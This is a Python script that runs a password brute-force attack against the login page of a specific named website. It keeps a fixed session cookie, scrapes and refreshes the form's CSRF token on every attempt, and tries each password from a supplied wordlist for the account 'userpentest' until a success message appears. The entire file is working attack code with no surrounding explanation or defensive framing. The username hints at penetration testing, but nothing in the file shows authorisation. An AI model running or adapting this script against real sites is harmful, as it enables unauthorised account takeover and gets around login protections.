from sys import argv
import requests
from bs4 import BeautifulSoup

# give our arguments more semantic friendly names
script, filename, success_message = argv
txt = open(filename)

# set up our target, cookie and session
url = 'https://web.pesanku.biz/login.php'
cookie = {'PHPSESSID':'hi3au1ai392v9l3acf4qkoe5vr'}
s = requests.Session()
target_page = s.get(url, cookies=cookie)

'''
checkSuccess
@param: html (String)

Searches the response HTML for our specified success message
'''
def checkSuccess(html):
    # get our soup ready for searching
    soup = BeautifulSoup(html, "html.parser")
    # check for our success message in the soup
    search = soup.findAll(text=success_message)

    if not search:
        success = False
    
    else:
        success = True

    # return the brute force result
    return success

# Get the intial CSRF token from the target site
page_source = target_page.text
soup = BeautifulSoup(page_source, "html.parser")
csrf_token = soup.findAll(attrs={"name": "zebra_csrf_token_formLogin"})[0].get('value')

# Display before attack
print ('Target URL = ' + url)
print ('CSRF Token = ' + csrf_token)

# Loop through our provided password file
with open(filename) as f:
    print ('Running brute force attack...')
    for password in f:

        # Displays password tries and strips whitespace from password list
        print ('password tryed: ' + password)
        password = password.strip()

        # setup the payload
        payload = {'name_formLogin': 'formLogin', 'zebra_honeypot_formLogin': '', 'zebra_csrf_token_formLogin': csrf_token, 'userid': 'userpentest', 'password': password, 'tbl1': 'Login'}
        r = s.post(url, cookies=cookie, data=payload)
        success = checkSuccess(r.text)

        if not success:
            # if it failed the CSRF token will be changed. Get the new one
            soup = BeautifulSoup(r.text, "html.parser")
            csrf_token = soup.findAll(attrs={"name": "zebra_csrf_token_formLogin"})[0].get('value')
        
        else:
            # Success! Show the result
            print ('Password is: ' + password)
            break

    # We failed, bummer. 
    if not success:
        print ('Brute force failed. No matches found.')
